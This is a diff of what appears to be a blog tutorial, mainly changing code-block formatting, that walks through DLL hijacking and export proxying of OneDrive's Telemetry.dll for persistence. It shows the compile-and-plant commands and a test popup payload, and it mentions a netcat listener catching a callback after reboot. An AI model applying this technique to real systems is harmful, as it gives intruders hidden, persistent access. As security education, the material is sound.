@@ -38,8 +38,10 @@ After applying it, we'll see that `C:\Users\IEUser\AppData\Local\Microsoft\OneDr
 
 Using sysinternals [sigcheck](https://learn.microsoft.com/en-us/sysinternals/downloads/sigcheck) utility we can see that it is a 64-bit dll.
 
-```
-C:\Tools>sigcheck64.exe C:\Users\IEUser\AppData\Local\Microsoft\OneDrive\22.191.0911.0001\Telemetry.dll
+<div class="language-plaintext highlighter-rouge">
+<div class="highlight">
+<pre class="highlight">
+<code>C:\Tools><span class="ow">sigcheck64.exe C:\Users\IEUser\AppData\Local\Microsoft\OneDrive\22.191.0911.0001\Telemetry.dll</span>
 
 Sigcheck v2.90 - File version and signature viewer
 Copyright (C) 2004-2022 Mark Russinovich
@@ -54,8 +56,10 @@ c:\users\ieuser\appdata\local\microsoft\onedrive\22.191.0911.0001\Telemetry.dll:
         Product:        Microsoft OneDrive
         Prod version:   22.191.0911.0001
         File version:   22.191.0911.0001
-        MachineType:    64-bit
-```
+        MachineType:    <span class="mi">64-bit</span>
+
+</code></pre></div></div>
+
 # What happens when we use any dll as `Telemetry.dll`
 
 Just for testing purposes let's see what happens if we use any dll to hijack `Telemetry.dll`. We will save the following C code as `dll.c`:
@@ -87,8 +91,10 @@ BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
 
 This dll will create a thread and show a message box upon being loaded. We will run `x64 Native Tools Command Prompt for VS 2022` and compile our code into `C:\...\OneDrive\Telemetry.dll`.
 
-```
-c:\Users\IEUser\dllp>cl dll.c /link /dll /out:C:\Users\IEUser\AppData\Local\Microsoft\OneDrive\Telemetry.dll
+<div class="language-plaintext highlighter-rouge">
+<div class="highlight">
+<pre class="highlight">
+<code>c:\Users\IEUser\dllp><span class="ow">cl dll.c /link /dll /out:C:\Users\IEUser\AppData\Local\Microsoft\OneDrive\Telemetry.dll</span>
 Microsoft (R) C/C++ Optimizing Compiler Version 19.33.31630 for x64
 Copyright (C) Microsoft Corporation.  All rights reserved.
 
@@ -100,31 +106,37 @@ Copyright (C) Microsoft Corporation.  All rights reserved.
 /dll
 /out:C:\Users\IEUser\AppData\Local\Microsoft\OneDrive\Telemetry.dll
 dll.obj
-```
+</code></pre></div></div>
 
 After that, when we try to restart OneDrive it will crash until we remove our dll.
 
-```
-c:\Users\IEUser\dllp>taskkill /IM "OneDrive.exe" /F
+<div class="language-plaintext highlighter-rouge">
+<div class="highlight">
+<pre class="highlight">
+<code>c:\Users\IEUser\dllp><span class="ow">taskkill /IM "OneDrive.exe" /F</span>
 SUCCESS: The process "OneDrive.exe" with PID 4168 has been terminated.
 
-c:\Users\IEUser\dllp>C:\Users\IEUser\AppData\Local\Microsoft\OneDrive\OneDrive.exe
+c:\Users\IEUser\dllp><span class="ow">C:\Users\IEUser\AppData\Local\Microsoft\OneDrive\OneDrive.exe</span>
 
-c:\Users\IEUser\dllp>tasklist | findstr OneDrive
+c:\Users\IEUser\dllp><span class="ow">tasklist | findstr OneDrive</span>
 
-c:\Users\IEUser\dllp>del C:\Users\IEUser\AppData\Local\Microsoft\OneDrive\Telemetry.dll
+c:\Users\IEUser\dllp><span class="ow">del C:\Users\IEUser\AppData\Local\Microsoft\OneDrive\Telemetry.dll</span>
 
-c:\Users\IEUser\dllp>C:\Users\IEUser\AppData\Local\Microsoft\OneDrive\OneDrive.exe
+c:\Users\IEUser\dllp><span class="ow">C:\Users\IEUser\AppData\Local\Microsoft\OneDrive\OneDrive.exe</span>
 
-c:\Users\IEUser\dllp>tasklist | findstr OneDrive
+c:\Users\IEUser\dllp><span class="ow">tasklist | findstr OneDrive</span>
 OneDrive.exe                  4864 RDP-Tcp#1                  2    126,888 K
-```
+</code></pre></div></div>
+
+
 
 # Proxying calls into the original `Telemetry.dll`
 Let's transfer `Telemetry.dll` to a linux box and take a look at it. What we have to do now is to get a list of all exports of the original `Telemetry.dll` so our dll handles all of them. We can get this list using [pefile](https://github.com/erocarrera/pefile).
 
-```bash
-$ python -m pefile exports Telemetry.dll
+<div class="language-plaintext highlighter-rouge">
+<div class="highlight">
+<pre class="highlight">
+<code>$ <span class="ow">python -m pefile exports Telemetry.dll</span>
 0x180010790 b'??0AddMountedFolderScenario@QoS@@QEAA@XZ' 1
 0x180010910 b'??0AutoMountScenario@QoS@@QEAA@XZ' 2
 0x18000f6f0 b'??0CheckQuotaInfoScenario@@QEAA@XZ' 3
@@ -137,7 +149,7 @@ $ python -m pefile exports Telemetry.dll
 0x18000fcc0 b'??0KFMUserInitiatedScanScenario@@QEAA@XZ' 10
 0x1800089f0 b'??0QosSyncWrapperConfig@QoS@@QEAA@I_N00PEB_W11@Z' 11
 ... and a lot more ...
-```
+</code></pre></div></div>
 
 And for each of those symbols we would like to _proxy_ them to a copy of the original `Telemetry.dll` named, say, `TelemetryOrig.dll`. We can do this using the [/EXPORT MSVC linker option](https://learn.microsoft.com/en-us/cpp/build/reference/export-exports-a-function?view=msvc-170). For example to proxy `FooFunction` we would use something like:
 
@@ -197,10 +209,11 @@ BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
 
 Let's try it:
 
-```bash
-$ chmod +x ./make_pragmas.sh
-$ ./make_pragmas.sh > dll.c
-```
+<div class="language-plaintext highlighter-rouge">
+<div class="highlight">
+<pre class="highlight">
+<code>$ <span class="ow">chmod +x ./make_pragmas.sh</span>
+$ <span class="ow">./make_pragmas.sh > dll.c</span></code></pre></div></div>
 
 It should generate a file that looks something like:
 
@@ -241,23 +254,28 @@ BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
 
 Now, we will try to compile the generated code on a windows box and see if we will manage to run our simple popup 'payload' without crashing OneDrive. First, let's make sure that OneDrive is not running.
 
-```
-c:\>taskkill /IM "OneDrive.exe" /F
+<div class="language-plaintext highlighter-rouge">
+<div class="highlight">
+<pre class="highlight">
+<code>c:\><span class="ow">taskkill /IM "OneDrive.exe" /F</span>
 SUCCESS: The process "OneDrive.exe" with PID 4864 has been terminated.
-```
+</code></pre></div></div>
 
 Then, let's store the original `Telemetry.dll` as `TelemetryOrig.dll` in OneDrive's directory.
 
-```
-c:\>copy C:\Users\IEUser\AppData\Local\Microsoft\OneDrive\22.191.0911.0001\Telemetry.dll C:\Users\IEUser\AppData\Local\Microsoft\OneDrive\TelemetryOrig.dll
+<div class="language-plaintext highlighter-rouge">
+<div class="highlight">
+<pre class="highlight">
+<code>c:\><span class="ow">copy C:\Users\IEUser\AppData\Local\Microsoft\OneDrive\22.191.0911.0001\Telemetry.dll C:\Users\IEUser\AppData\Local\Microsoft\OneDrive\TelemetryOrig.dll</span>
         1 file(s) copied.
-
-```
+</code></pre></div></div>
 
 And finally we'll compile our new code and start OneDrive.
 
-```
-c:\Users\IEUser\dllp>cl dll.c /link /dll /out:C:\Users\IEUser\AppData\Local\Microsoft\OneDrive\Telemetry.dll
+<div class="language-plaintext highlighter-rouge">
+<div class="highlight">
+<pre class="highlight">
+<code>c:\Users\IEUser\dllp><span class="ow">cl dll.c /link /dll /out:C:\Users\IEUser\AppData\Local\Microsoft\OneDrive\Telemetry.dll</span>
 Microsoft (R) C/C++ Optimizing Compiler Version 19.33.31630 for x64
 Copyright (C) Microsoft Corporation.  All rights reserved.
 
@@ -271,8 +289,8 @@ Copyright (C) Microsoft Corporation.  All rights reserved.
 dll.obj
    Creating library C:\Users\IEUser\AppData\Local\Microsoft\OneDrive\Telemetry.lib and object C:\Users\IEUser\AppData\Local\Microsoft\OneDrive\Telemetry.exp
 
-c:\Users\IEUser\dllp>C:\Users\IEUser\AppData\Local\Microsoft\OneDrive\OneDrive.exe
-```
+c:\Users\IEUser\dllp><span class="ow">C:\Users\IEUser\AppData\Local\Microsoft\OneDrive\OneDrive.exe</span>
+</code></pre></div></div>
 
 This time our MessageBox popup fired and OneDrive did not crash!
 
@@ -297,17 +315,20 @@ DWORD WINAPI ThreadFunc(void* data) {
 
 Next, I'll recompile the dll and restart the box.
 
-```
-c:\Users\IEUser\dllp>taskkill /IM "OneDrive.exe" /F
+<div class="language-plaintext highlighter-rouge">
+<div class="highlight">
+<pre class="highlight">
+<code>c:\Users\IEUser\dllp><span class="ow">taskkill /IM "OneDrive.exe" /F</span>
 SUCCESS: The process "OneDrive.exe" with PID 3232 has been terminated.
 
-c:\Users\IEUser\dllp>cl dll.c /link /dll /out:C:\Users\IEUser\AppData\Local\Microsoft\OneDrive\Telemetry.dll
+c:\Users\IEUser\dllp><span class="ow">cl dll.c /link /dll /out:C:\Users\IEUser\AppData\Local\Microsoft\OneDrive\Telemetry.dll</span>
 Microsoft (R) C/C++ Optimizing Compiler Version 19.33.31630 for x64
 Copyright (C) Microsoft Corporation.  All rights reserved.
 ...
 
-c:\Users\IEUser\dllp>shutdown /r /t 0
-```
+c:\Users\IEUser\dllp><span class="ow">shutdown /r /t 0</span>
+</code></pre></div></div>
+
 
 On my linux box I start a netcat lister on port 443 and log in to the windows box. After a while I get a connection.
 
